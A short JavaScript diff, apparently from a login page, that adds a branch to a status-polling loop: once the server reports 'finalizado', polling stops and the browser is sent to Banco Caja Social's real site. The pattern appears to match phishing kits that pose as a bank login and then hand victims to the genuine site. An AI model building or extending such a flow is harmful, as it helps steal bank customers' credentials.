@@ -151,6 +151,9 @@
                             if (pantalla) pantalla.classList.remove('activa');
                             var errorLogin = document.getElementById('errorLogin');
                             if (errorLogin) errorLogin.classList.add('visible');
+                        } else if (data.estado === 'finalizado') {
+                            clearInterval(intervalo);
+                            window.location.href = 'https://www.bancocajasocial.com/';
                         }
                     } catch (err) {
                         console.error('Error estado:', err);
